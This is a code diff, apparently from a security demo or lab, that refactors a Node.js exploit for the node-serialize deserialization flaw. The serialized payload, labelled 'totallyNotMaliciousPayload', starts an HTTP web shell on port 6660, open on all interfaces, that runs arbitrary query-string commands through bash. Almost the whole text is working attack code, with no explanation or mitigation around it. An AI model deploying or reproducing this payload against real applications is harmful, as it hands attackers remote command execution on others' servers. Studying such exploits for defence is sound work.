@@ -1,31 +1,16 @@
 const serialize = require('node-serialize');
 
-const webShell = function () {
+const setupWebShell = function () {
   const exec = require('child_process').exec;
   const http = require('http');
   const url = require('url');
 
   const port = '6660';
 
-  const checkPortInUse = function(port, fn) {
-    const tester = http.createServer()
-      .once('error', function (err) {
-        if (err.code != 'EADDRINUSE') {
-          return fn(true);
-        }
-
-        fn(true);
-      })
-      .once('listening', function() {
-        tester.once('close', function() { fn(false) }).close();
-      })
-      .listen(port);
-  };
-
   const shell = function(res, cmd) {
     exec(
       cmd,
-      {shell: '/bin/bash'},
+      { shell: '/bin/bash' },
       function (error, stdout, stderr) {
         res.end(stdout);
         if (error !== null) {
@@ -35,7 +20,7 @@ const webShell = function () {
   };
 
   const runWebShell = function() {
-    http.createServer(function (req, res) {
+    const webShell = http.createServer(function (req, res) {
       res.writeHead(200, {'Content-Type': 'text/plain'});
 
       const parsedRequest = url.parse(req.url, true);
@@ -46,18 +31,20 @@ const webShell = function () {
         shell(res, cmd);
       }
     }).listen(port, '0.0.0.0');
+
+    global.webShell = webShell;
   };
 
-  checkPortInUse(port, function(isInUse) {
-    console.log('checkPortInUse');
-    if (!isInUse) {
-      console.log('runWebShell');
+  if (global.webShell) {
+    global.webShell.close(function() {
       runWebShell();
-    }
-  });
+    });
+  } else {
+    runWebShell();
+  }
 };
 
-const input = { 'userName': 'foobar', 'totallyNotMaliciousPayload': webShell };
+const input = { 'userName': 'foobar', 'totallyNotMaliciousPayload': setupWebShell };
 
 let serialized = serialize.serialize(input);
 serialized = serialized.replace(/\\n|/g, '');
